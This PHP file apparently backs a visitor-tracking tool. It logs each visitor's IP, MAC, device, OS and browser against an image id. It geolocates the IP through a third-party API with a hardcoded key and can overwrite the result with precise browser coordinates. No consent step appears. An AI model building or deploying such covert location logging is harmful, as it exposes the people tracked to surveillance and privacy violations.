
<?php

use function PHPSTORM_META\type;

require('UserInfo.php');
function getUsers()
{
    return json_decode(file_get_contents("users.json"), true);
}


function getUserBydate($date)
{
    $users = getUsers();
    foreach ($users as $user) {
        if ($user['date'] == $date) {
            return $user;
        }
    }
    return null;
}

function deleteUser($date)
{
    $users = getUsers();
    foreach ($users as $i => $user) {
        if ($user['date'] == $date) {
            unset($users[$i]);
        };
    };
    $users = json_encode($users);
    file_put_contents('users.json', $users);
}

function deleteall()
{
    $users = [];
    $users = json_encode($users);
    file_put_contents('users.json', $users);
}

function getInfo($id)
{


    $date = date("Y-m-d H:i:s");
    $ip = UserInfo::get_ip();
    $mac = UserInfo::get_mac();
    $device = UserInfo::get_device();
    $os = UserInfo::get_os();
    $browser = UserInfo::get_browser();
    $notes = '';

 
    if ($ip == "::1") {
        $ip = "91.106.45.252";
    };

    try {

        $details = json_decode(file_get_contents("https://api.ipregistry.co/${ip}?key=x1nafz8ls4tjqsw4"), true);
        $provider = $details['connection']['organization'];
  
            $latitude = $details['location']['latitude'];
            $longtitude = $details['location']['longitude'];
            $method = 'ipaddress';
        
    } catch (Exception $e) {
        $provider = $e;
        $method = 'error ipaddress';
    }



    $newarray = [
        'date' => $date, 'ip' => $ip, 'mac' => $mac, 'device' => $device,
        'os' => $os, 'browser' => $browser, 'latitude' => $latitude, 'longtitude' => $longtitude,
        'method' => $method, 'provider' => $provider, 'image' => $id, 'notes' => $notes
    ];
    return $newarray;
}

function createUser($id)
{
  
    $newData = getInfo($id);
    $users = getUsers();
    $users[] = $newData;
    $users = json_encode($users);
    file_put_contents('users.json', $users);
    return $newData['date'];
}


function updateUser($data, $date)
{
    $users = getUsers();
    foreach ($users as $i => $user) {
        if ($user['date'] == $date) {
            $users[$i] = array_merge($user, $data);
            $users = json_encode($users);
            file_put_contents('users.json', $users);
        };
    };
}


function updategeo($date, $lat, $long)
{
    $users = getUsers();
    foreach ($users as $i => $user) {
        if ($user['date'] == $date) {
            $data = [
                'latitude' => $lat, 'longtitude' => $long,
                'method' => "GetCurrentLocation",
            ];
            $users[$i] = array_merge($user, $data);
            $users = json_encode($users);
            file_put_contents('users.json', $users);
        };
    };
}


?>